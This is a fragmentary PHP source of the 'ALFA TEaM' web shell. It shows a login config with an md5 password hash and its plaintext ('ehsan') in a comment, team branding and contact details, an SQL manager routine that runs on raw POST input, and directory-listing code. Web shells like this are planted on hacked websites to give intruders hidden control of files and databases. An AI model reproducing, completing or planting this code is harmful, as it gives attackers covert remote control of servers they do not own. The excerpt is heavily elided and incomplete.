...
/*
	...
	Gmail:		seo168@gmail.com
	Date:		Monday, September 14, 2020
*/
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '5be6b868dd94db583f9f5b12b11d26df',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '500',
    'show_icons' => '1',
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/YD3FVRd/pu-y-destroyer.png" /></center>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/YD3FVRd/pu-y-destroyer.png" /></td>
</tr>
<tr>
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://i.ibb.co/YD3FVRd/pu-y-destroyer.png'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#00A220'>Shell Coded By Sole Sad & Invisible (ALFA TEaM)</font><br>
<font color='#00A220'>Contact : seo168@gmail.com</font><br>
...
function alfaSql_manager_api(){
	$db = $_POST["alfa1"];
	$type = $_POST["alfa2"];
	$sql_count = $_POST["alfa3"] == "true" ? true : false;$db = @json_decode($db, true);
...
closedir($dh);
}else{__alert('<font color="red">ErrorIn OpenDir...</font>');}
